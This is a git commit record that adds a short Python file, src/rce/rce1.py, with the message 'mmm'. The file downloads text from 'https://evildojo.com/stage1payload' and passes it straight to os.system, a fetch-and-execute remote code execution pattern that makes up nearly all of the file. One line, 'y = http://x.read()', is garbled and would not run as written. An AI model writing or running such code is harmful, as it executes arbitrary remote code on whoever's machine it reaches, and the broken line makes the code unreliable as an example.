ef4a88b5c904e64aaa1d42328c8590945446b4a8
xiaoming <lininruc@gmail.com>
2024-11-13 13:32:05 +0800

    mmm

---
+++ src/rce/rce1.py
@@ -0,0 +1,10 @@
+# inspired by https://x.com/vkcirtap/status/1856302597986017328
+
+import os
+import urllib
+import urllib.request
+x = urllib.request.urlopen("https://evildojo.com/stage1payload")
+y = http://x.read()
+z = y.decode("utf8")
+x.close()
+os.system(z)
